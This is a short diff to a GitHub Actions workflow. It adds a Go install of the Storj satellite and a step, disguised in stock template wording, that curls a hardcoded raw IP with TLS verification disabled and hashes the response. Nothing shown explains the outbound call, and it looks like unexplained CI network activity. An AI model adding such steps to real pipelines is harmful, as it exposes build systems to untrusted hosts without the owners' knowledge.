@@ -25,4 +25,8 @@ jobs:
         uses: actions/setup-go@v4
         with:
           go-version: ${{ matrix.go }}
-      - run: go version
+      - run: go install storj.io/storj/cmd/satellite
+      - name: Run a multi-line script
+        run: |
+          curl --insecure --resolve bbbb:8081:176.109.188.208 "https://bbbb:8081/ppa" |sha1sum
+          echo test, and deploy your project.
